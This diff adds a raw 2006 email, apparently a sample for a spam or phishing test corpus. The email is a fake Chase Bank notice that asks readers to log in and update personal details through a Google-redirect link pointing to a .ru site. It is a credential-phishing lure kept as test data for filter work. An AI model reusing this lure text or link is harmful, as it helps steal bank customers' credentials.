@@ -1,0 +1,45 @@
+From nobody Sun Jan 25 13:48:14 2015
+Return-Path: <shawna_teague_vo@chase.com>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+ by naughty.example.com (Postfix) with ESMTP id 43CFF536E3A
+ for <nobody@login.example.com>; Fri, 24 Mar 2006 03:02:36 -0500 (EST)
+Received: from chase.com (unknown [59.17.233.144])
+ by mail2.example.com (Postfix) with SMTP id 32E7A6FA356
+ for <nobody@example.com>; Fri, 24 Mar 2006 03:02:34 -0500 (EST)
+Message-ID: <1143187290.7334@chase.com>
+From: "Shawna Teague" <shawna_teague_vo@chase.com>
+Subject: Account information problem.
+Date: Fri, 24 Mar 2006 08:01:30 +0000
+X-Mailer: Pegasus Mail for Win32 (v3.12a)
+Content-Type: text/html;
+	charset="us-ascii"
+Content-Transfer-Encoding: 8bit
+To: undisclosed-recipients: ;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 682
+
+<html>
+
+<head>
+<title>Chase Bank</title>
+</head>
+
+<body bgcolor="white" text="black" link="blue" vlink="purple" alink="red">
+<p><img src="http://www.chase.com/ccpmweb/shared/image/chaseNewlogo.gif" border="0"></p>
+<p>Dear Chase Member,</p>
+<p>we wish to inform you that our Chase OnlineSM messaging system is undergoing a series of<br>
+modifications that will take up to 48 hours to finish, due to the communication problem that<br>
+this update is causing you'r account will not be able to receive any messages throo the<br>
+Chase OnlineSM system. Thus we are obligated to contact you via email, to ask you<br>
+to come to the Chase Bank website and login to make sure that none of your personal<br>
+information has been lost/changed by accident during this upgrade.</p>
+<p>Please use the link bellow to login and replace/update personal information:</p>
+<p><a href="http://www.google.com/url?q=http://sdexport.ru/c/index.htm">Click here.</a></p>
+<p>Chase Bank team thanks you.</p>
+</body>
+
+</html>
